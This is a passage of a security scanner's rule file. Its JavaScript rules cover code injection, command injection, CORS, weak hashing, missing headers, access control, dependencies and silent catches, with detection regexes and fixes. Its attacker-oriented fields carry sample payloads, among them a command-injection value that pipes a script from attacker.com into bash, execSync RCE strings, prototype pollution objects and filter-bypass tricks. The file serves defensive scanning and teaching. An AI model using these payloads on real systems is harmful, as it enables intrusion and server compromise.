      "// Sanitize keys before merging user input\nfunction sanitizeKeys(obj) {\n  const forbidden = ['__proto__', 'constructor', 'prototype'];\n  return Object.fromEntries(\n    Object.entries(obj).filter(([k]) => !forbidden.includes(k))\n  );\n}\nconst safeData = sanitizeKeys(req.body);\nObject.assign(target, safeData);",
    threatScenario:
      'A deep merge function processes user-supplied JSON. An attacker sends {"__proto__": {"isAdmin": true}} to set isAdmin on all objects, bypassing authorization checks throughout the application.',
    attackerPerspective:
      "Prototype pollution is a powerful attack vector in Node.js. It can bypass authorization checks, enable RCE via template engines (Handlebars, Pug), and corrupt application state globally.",
    exploitationReasoning:
      "Setting __proto__.isAdmin = true affects every object in the process. If any code checks obj.isAdmin without hasOwnProperty, the check passes for all objects, granting universal admin access.",
    impactAnalysis:
      "Privilege escalation, authentication bypass, remote code execution via template engine gadgets, and denial of service through property corruption.",
    bypassConsiderations:
      'Try constructor.prototype instead of __proto__ if the latter is blocked. Use nested payloads: {"a": {"__proto__": {"polluted": true}}}. Test with JSON.parse which does not prevent prototype pollution.',
    manualVerificationChecklist: [
      'Send {"__proto__": {"polluted": true}} and check if ({}).polluted === true',
      "Test constructor.prototype pollution as an alternative vector",
      "Check if deep merge functions sanitize keys",
      "Verify lodash and other merge utilities are up to date",
      "Test for RCE via Handlebars/Pug template engine gadgets",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── NEW: eval / Function Constructor Injection ───────────────────────────────
  {
    ruleId: "CF-015",
    name: "Code Injection via eval / Function Constructor",
    languageScope: ["javascript", "typescript"],
    pattern:
      "(?:eval\\s*\\(\\s*(?!['\"`]\\s*\\))|new\\s+Function\\s*\\(\\s*(?:req\\.|request\\.|params\\.|query\\.|body\\.|\\w+(?:Input|Data|Code|Expr|Script|Payload))|setTimeout\\s*\\(\\s*(?:req\\.|request\\.|params\\.|query\\.|body\\.)|setInterval\\s*\\(\\s*(?:req\\.|request\\.|params\\.|query\\.|body\\.))",
    patternFlags: "i",
    owaspCategory: "A03:2021 – Injection",
    severity: "high",
    developerExplanation:
      "Passing user-controlled input to eval(), new Function(), setTimeout(), or setInterval() with a string argument executes arbitrary JavaScript code in the application context. This is a critical code injection vulnerability that can lead to full server compromise in Node.js environments.",
    secureAlternative:
      "Never use eval() or new Function() with user input. For mathematical expressions, use a safe parser like mathjs. For JSON, use JSON.parse(). For dynamic behavior, use a whitelist of allowed operations.",
    suggestedFix:
      "// Instead of: eval(userExpression)\n// For math expressions, use a safe evaluator:\nconst { evaluate } = require('mathjs');\ntry {\n  const result = evaluate(userExpression);\n} catch (e) {\n  res.status(400).send('Invalid expression');\n}\n\n// For JSON data: always use JSON.parse() instead of eval()",
    threatScenario:
      "A calculator API endpoint evaluates user-supplied expressions with eval(req.query.expr). An attacker submits \"process.mainModule.require('child_process').execSync('id')\" to execute OS commands.",
    attackerPerspective:
      "eval() with user input is an instant RCE. In Node.js, attackers can access the require() function to load child_process and execute arbitrary OS commands with the server's privileges.",
    exploitationReasoning:
      "JavaScript eval() executes any valid JS code. In Node.js, global.process provides access to the entire Node.js API. A single eval() call can establish a reverse shell or exfiltrate all environment variables.",
    impactAnalysis:
      "Remote code execution, full server compromise, environment variable exfiltration (secrets, API keys), file system access, and lateral movement within the infrastructure.",
    bypassConsiderations:
      'Sandboxing via vm.runInNewContext() is not secure — known escapes exist. The "vm2" library had critical RCE CVEs. Avoid any dynamic code execution with user input.',
    manualVerificationChecklist: [
      'Test with eval("1+1") to confirm execution',
      "Try process.env to check environment variable access",
      'Attempt require("child_process").execSync("id")',
      "Check if vm.runInNewContext() is used (sandbox escapes exist)",
      "Verify no user input reaches any dynamic code execution function",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── NEW: Insecure child_process.exec ────────────────────────────────────────
  {
    ruleId: "CF-016",
    name: "Insecure child_process.exec with User Input",
    languageScope: ["javascript", "typescript"],
    pattern:
      "(?:exec|execSync)\\s*\\(\\s*(?:['\"`][^'\"`;]*(?:\\+\\s*\\w|\\$\\{[^}]+\\})|[^'\"`;\\n]*\\+\\s*(?:req\\.|request\\.|params\\.|query\\.|body\\.|\\w+(?:Input|Param|Arg|Cmd|Command|File|Name|Path)))",
    patternFlags: "i",
    owaspCategory: "A03:2021 – Injection",
    severity: "high",
    developerExplanation:
      "child_process.exec() passes its argument to the system shell (/bin/sh), which interprets shell metacharacters. Concatenating user input into exec() calls allows attackers to inject shell commands using characters like ;, &&, |, $(), or backticks.",
    secureAlternative:
      "Use child_process.execFile() or child_process.spawn() with an argument array instead of a shell string. These functions do not invoke a shell and do not interpret metacharacters.",
    suggestedFix:
      "const { execFile } = require('child_process');\n// Instead of: exec('convert ' + userFilename)\n// Use execFile with separate arguments (no shell):\nexecFile('convert', [userFilename, outputPath], { timeout: 5000 }, (err, stdout) => {\n  if (err) return res.status(500).send('Conversion failed');\n  res.send(stdout);\n});",
    threatScenario:
      'An image processing endpoint runs exec("convert " + req.query.filename). An attacker submits "image.jpg; curl http://attacker.com/shell.sh | bash" to download and execute a reverse shell.',
    attackerPerspective:
      "exec() with user input is a classic command injection target. Automated scanners and manual testers always check for shell metacharacters in parameters that appear to be used in system commands.",
    exploitationReasoning:
      "The shell interprets ; as a command separator, && as conditional execution, and $() as command substitution. Any of these in user input allows injecting additional commands that execute with the Node.js process privileges.",
    impactAnalysis:
      "Remote code execution, full server compromise, data exfiltration, reverse shell establishment, and lateral movement within the network.",
    bypassConsiderations:
      "Filters blocking ; can be bypassed with %0a (newline), $IFS for space substitution, or ${IFS} in bash. Backtick command substitution (`id`) works in many shells. Test all shell metacharacters.",
    manualVerificationChecklist: [
      "Test with ; id to check command injection",
      "Try && whoami for conditional execution",
      "Test $() subshell: $(id)",
      "Check if the process runs as root or a privileged user",
      "Verify execFile or spawn with arrays is used instead of exec",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── Security Misconfiguration ────────────────────────────────────────────────
  {
    ruleId: "CF-017",
    name: "CORS Wildcard Origin",
    languageScope: ["javascript", "typescript", "python", "java", "php", "go"],
    pattern:
      "(Access-Control-Allow-Origin|cors\\s*\\(|allowedOrigins|origin\\s*:)\\s*['\"]?\\*['\"]?",
    patternFlags: "i",
    owaspCategory: "A05:2021 – Security Misconfiguration",
    severity: "medium",
    developerExplanation:
      "Setting Access-Control-Allow-Origin: * allows any website to make cross-origin requests to your API. Combined with Access-Control-Allow-Credentials: true, this can expose authenticated endpoints to cross-origin attacks.",
    secureAlternative:
      'Specify an explicit list of allowed origins. Use environment-specific configuration: cors({ origin: process.env.ALLOWED_ORIGINS.split(",") }). Never combine wildcard origin with credentials.',
    suggestedFix:
      "const cors = require('cors');\nconst allowedOrigins = process.env.ALLOWED_ORIGINS.split(',');\napp.use(cors({\n  origin: (origin, callback) => {\n    if (!origin || allowedOrigins.includes(origin)) callback(null, true);\n    else callback(new Error('Not allowed by CORS'));\n  },\n  credentials: true\n}));",
    threatScenario:
      "An API with CORS wildcard and credentials enabled allows any malicious website to make authenticated requests on behalf of logged-in users, stealing data or performing actions.",
    attackerPerspective:
      "CORS misconfiguration is a common finding in bug bounty programs. Wildcard + credentials is an automatic critical finding. Even without credentials, wildcard CORS leaks API responses to any origin.",
    exploitationReasoning:
      "A malicious site can use fetch() with credentials: 'include' to make authenticated requests to the API. The browser sends cookies automatically, and the response is readable by the attacker's script.",
    impactAnalysis:
      "Data exfiltration from authenticated endpoints, CSRF-like attacks, account takeover, and exposure of sensitive API responses to any website.",
    bypassConsiderations:
      "Some implementations reflect the Origin header back as the allowed origin. Test by sending Origin: https://evil.com and checking if it appears in Access-Control-Allow-Origin.",
    manualVerificationChecklist: [
      "Check Access-Control-Allow-Origin response header",
      "Test with Origin: https://evil.com to check reflection",
      "Verify Access-Control-Allow-Credentials is not true with wildcard",
      "Test null origin: Origin: null",
      "Check if subdomain wildcards are used: *.example.com",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── Weak Cryptography ────────────────────────────────────────────────────────
  {
    ruleId: "CF-018",
    name: "Weak Cryptographic Algorithm (MD5/SHA1)",
    languageScope: [
      "javascript",
      "typescript",
      "python",
      "java",
      "php",
      "go",
      "csharp",
    ],
    pattern:
      "(createHash\\s*\\(\\s*['\"]md5['\"]|createHash\\s*\\(\\s*['\"]sha1['\"]|md5\\s*\\(|sha1\\s*\\(|MessageDigest\\.getInstance\\s*\\(\\s*['\"]MD5['\"]|MessageDigest\\.getInstance\\s*\\(\\s*['\"]SHA-1['\"]|hashlib\\.md5|hashlib\\.sha1)",
    patternFlags: "i",
    owaspCategory: "A02:2021 – Cryptographic Failures",
    severity: "medium",
    developerExplanation:
      "MD5 and SHA-1 are cryptographically broken hash functions. MD5 has known collision attacks and SHA-1 was broken in 2017 (SHAttered attack). They should not be used for password hashing, digital signatures, or integrity verification.",
    secureAlternative:
      "Use SHA-256 or SHA-3 for general hashing. For password hashing, use bcrypt, scrypt, or Argon2. For HMAC, use HMAC-SHA256. Never use MD5 or SHA-1 for security-sensitive operations.",
    suggestedFix:
      "const crypto = require('crypto');\n// For general hashing:\nconst hash = crypto.createHash('sha256').update(data).digest('hex');\n\n// For password hashing, use bcrypt:\nconst bcrypt = require('bcrypt');\nconst hashedPassword = await bcrypt.hash(password, 12);",
    threatScenario:
      "User passwords are hashed with MD5. An attacker who obtains the database can crack all passwords in minutes using rainbow tables or GPU-accelerated brute force.",
    attackerPerspective:
      "MD5 password hashes are trivially cracked. CrackStation and similar services crack common MD5 hashes instantly. GPU rigs can compute billions of MD5 hashes per second.",
    exploitationReasoning:
      "MD5 produces a 128-bit hash. With modern GPUs computing 10+ billion MD5/second, an 8-character password hash can be cracked in minutes. Rainbow tables make common passwords instant.",
    impactAnalysis:
      "Mass credential compromise, account takeover, password reuse attacks across other services, and compliance violations.",
    bypassConsiderations:
      "Even with salting, MD5 is too fast for password hashing. Use intentionally slow algorithms (bcrypt, Argon2) that resist GPU acceleration.",
    manualVerificationChecklist: [
      "Identify all uses of MD5/SHA1 in the codebase",
      "Check if MD5/SHA1 is used for password hashing",
      "Verify password hashing uses bcrypt, scrypt, or Argon2",
      "Check digital signature algorithms for SHA-1 usage",
      "Review certificate pinning implementations for weak algorithms",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── Missing Security Headers ─────────────────────────────────────────────────
  {
    ruleId: "CF-019",
    name: "Missing Security Headers (Express.js)",
    languageScope: ["javascript", "typescript"],
    pattern:
      "(?:express\\s*\\(\\s*\\)|app\\s*=\\s*express\\s*\\(\\s*\\))(?![\\s\\S]*helmet)",
    patternFlags: "i",
    owaspCategory: "A05:2021 – Security Misconfiguration",
    severity: "medium",
    developerExplanation:
      "Express.js applications without the helmet middleware are missing critical security headers including Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, and Strict-Transport-Security. These headers protect against XSS, clickjacking, and MIME sniffing attacks.",
    secureAlternative:
      "Install and use the helmet middleware: app.use(helmet()). Configure CSP explicitly for your application. This adds 11+ security headers with secure defaults.",
    suggestedFix:
      "const helmet = require('helmet');\nconst express = require('express');\nconst app = express();\n\n// Add security headers with helmet\napp.use(helmet());\n// Or configure CSP explicitly:\napp.use(helmet.contentSecurityPolicy({\n  directives: { defaultSrc: [\"'self'\"], scriptSrc: [\"'self'\"] }\n}));",
    threatScenario:
      "Without X-Frame-Options, the application is vulnerable to clickjacking. Without CSP, XSS attacks have no browser-level mitigation. Without HSTS, users can be downgraded to HTTP.",
    attackerPerspective:
      "Missing security headers are low-hanging fruit in bug bounty programs. Automated scanners (OWASP ZAP, Burp Suite) flag these immediately. They enable or amplify other attacks.",
    exploitationReasoning:
      "Missing X-Frame-Options allows embedding the app in an iframe for clickjacking. Missing CSP allows inline script execution. Missing HSTS enables SSL stripping attacks on HTTP connections.",
    impactAnalysis:
      "Clickjacking attacks, amplified XSS impact, SSL stripping, MIME confusion attacks, and reduced defense-in-depth.",
    bypassConsiderations:
      "Even with helmet, CSP must be carefully configured. Unsafe-inline and unsafe-eval in CSP negate its protection. Verify the actual header values, not just helmet presence.",
    manualVerificationChecklist: [
      "Check response headers with curl -I https://target.com",
      "Verify Content-Security-Policy is present and restrictive",
      "Check X-Frame-Options or CSP frame-ancestors directive",
      "Verify Strict-Transport-Security with includeSubDomains",
      "Test X-Content-Type-Options: nosniff is present",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── Broken Access Control ────────────────────────────────────────────────────
  {
    ruleId: "CF-020",
    name: "Missing Authorization Check",
    languageScope: ["javascript", "typescript", "python", "java", "php"],
    pattern:
      "(app|router)\\.(get|post|put|delete|patch)\\s*\\([^,]+,\\s*(?:async\\s*)?(?:\\([^)]*(?:req|request)[^)]*\\)|[^=]+=>)\\s*(?!.*(?:auth|verify|check|middleware|protect|guard|require|isAuthenticated|isAuthorized|hasRole|hasPermission))\\s*\\{",
    patternFlags: "i",
    owaspCategory: "A01:2021 – Broken Access Control",
    severity: "medium",
    developerExplanation:
      "Route handlers that do not include authentication or authorization middleware may be accessible to unauthenticated users. Every sensitive endpoint should verify the caller's identity and permissions before processing the request.",
    secureAlternative:
      'Apply authentication middleware to all sensitive routes. Use role-based access control (RBAC). Implement middleware chains: router.get("/admin", authenticate, authorize("admin"), handler).',
    suggestedFix:
      "// Define auth middleware\nconst authenticate = (req, res, next) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  if (!token) return res.status(401).json({ error: 'Unauthorized' });\n  try {\n    req.user = jwt.verify(token, process.env.JWT_SECRET);\n    next();\n  } catch { res.status(401).json({ error: 'Invalid token' }); }\n};\n\n// Apply to routes\napp.get('/user', authenticate, (req, res) => { ... });",
    threatScenario:
      "An admin API endpoint lacks authentication middleware. Any unauthenticated user who discovers the endpoint URL can access or modify all user data.",
    attackerPerspective:
      "Broken access control is the #1 OWASP vulnerability. Attackers enumerate API endpoints, test them without authentication, and look for IDOR vulnerabilities by changing IDs in requests.",
    exploitationReasoning:
      "Without authentication checks, any request to the endpoint is processed. Attackers use tools like ffuf or dirsearch to discover unprotected endpoints and access them directly.",
    impactAnalysis:
      "Unauthorized data access, privilege escalation, data modification or deletion, and complete application compromise.",
    bypassConsiderations:
      "Even with authentication, check for IDOR: can user A access user B's data by changing the ID? Test horizontal and vertical privilege escalation.",
    manualVerificationChecklist: [
      "Test all endpoints without authentication headers",
      "Check if admin endpoints are accessible to regular users",
      "Test IDOR by changing user IDs in requests",
      "Verify authorization checks are server-side, not just client-side",
      "Test HTTP method override (X-HTTP-Method-Override header)",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── Dependency Confusion ─────────────────────────────────────────────────────
  {
    ruleId: "CF-021",
    name: "Outdated or Vulnerable Dependency Pattern",
    languageScope: ["javascript", "typescript"],
    pattern:
      "(require\\s*\\(\\s*['\"](?:lodash|moment|request|express|mongoose|sequelize|passport)['\"]\\s*\\))",
    patternFlags: "i",
    owaspCategory: "A06:2021 – Vulnerable and Outdated Components",
    severity: "low",
    developerExplanation:
      "Common Node.js packages have had critical vulnerabilities in past versions. Using outdated versions of lodash (prototype pollution), moment.js (ReDoS), request (deprecated), or other packages may expose the application to known CVEs.",
    secureAlternative:
      "Run npm audit regularly. Use npm audit fix to patch known vulnerabilities. Consider replacing deprecated packages (request → axios/node-fetch, moment → date-fns/dayjs). Pin dependency versions and use lockfiles.",
    suggestedFix:
      "# Check for vulnerabilities:\nnpm audit\n\n# Fix automatically where possible:\nnpm audit fix\n\n# Check specific package version:\nnpm list lodash\n\n# Update to latest:\nnpm update lodash",
    threatScenario:
      "An application uses lodash < 4.17.21 which is vulnerable to prototype pollution (CVE-2021-23337). An attacker exploits the vulnerability to escalate privileges or achieve RCE.",
    attackerPerspective:
      "Attackers scan npm package.json files for known vulnerable versions. CVE databases and tools like Snyk, npm audit, and OWASP Dependency-Check automate this detection.",
    exploitationReasoning:
      "Known CVEs have public proof-of-concept exploits. Once a vulnerable package is identified, exploitation is often straightforward using published exploit code.",
    impactAnalysis:
      "Depends on the specific CVE: prototype pollution, ReDoS, path traversal, RCE, or information disclosure depending on the vulnerable package and version.",
    bypassConsiderations:
      "Virtual patching via WAF may not cover all exploit variants. The only reliable fix is updating the vulnerable package.",
    manualVerificationChecklist: [
      "Run npm audit and review all findings",
      "Check package.json for pinned vulnerable versions",
      "Verify node_modules versions match package-lock.json",
      "Check for transitive dependency vulnerabilities",
      "Review Snyk or GitHub Dependabot alerts",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── Logging & Monitoring ─────────────────────────────────────────────────────
  {
    ruleId: "CF-022",
    name: "Missing Error Handling / Silent Catch",
    languageScope: [
      "javascript",
      "typescript",
      "python",
      "java",
      "php",
      "go",
      "csharp",
    ],
    pattern:
      "catch\\s*\\([^)]*\\)\\s*\\{\\s*(?:\\/\\/[^\\n]*\\n\\s*)?\\}|except\\s*(?:Exception|Error)?\\s*(?:as\\s+\\w+)?\\s*:\\s*pass",
    patternFlags: "i",
    owaspCategory: "A09:2021 – Security Logging and Monitoring Failures",
    severity: "low",
    developerExplanation:
      "Empty catch blocks or silent exception handling suppress errors without logging them. This prevents detection of attacks, hides application failures, and makes debugging impossible. Security events (failed logins, authorization failures) must be logged.",
    secureAlternative:
      "Always log caught exceptions with context. Use structured logging. Implement security event logging for authentication failures, authorization denials, and input validation errors.",
    suggestedFix:
      "const logger = require('./logger'); // use winston, pino, etc.\n\ntry {\n  // ... operation\n} catch (error) {\n  logger.error('Operation failed', {\n    error: error.message,\n    stack: error.stack,\n    userId: req.user?.id,\n    path: req.path\n  });\n  res.status(500).json({ error: 'Internal server error' });\n}",
    threatScenario:
      "Authentication failures are silently caught and ignored. An attacker performs a brute-force attack with thousands of attempts, but no alerts are triggered because failures are never logged.",
    attackerPerspective:
      "Silent error handling is a gift to attackers. It means attacks go undetected, no rate limiting triggers, and no incident response is initiated. Attackers can operate indefinitely.",
    exploitationReasoning:
      "Without logging, there is no audit trail. Attackers can probe the application, test payloads, and exfiltrate data without leaving any evidence in logs or triggering monitoring alerts.",
    impactAnalysis:
      "Undetected breaches, inability to perform incident response, compliance violations (PCI-DSS requires logging), and extended attacker dwell time.",
    bypassConsiderations:
      "Even with logging, ensure logs are tamper-proof and stored off-system. Attackers who compromise the server may delete local logs.",
    manualVerificationChecklist: [
      "Search for empty catch blocks in the codebase",
      "Verify authentication failures are logged with IP and timestamp",
      "Check if authorization denials generate security alerts",
      "Verify logs are shipped to a centralized, tamper-proof system",
      "Test if failed login attempts trigger rate limiting or lockout",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },
];
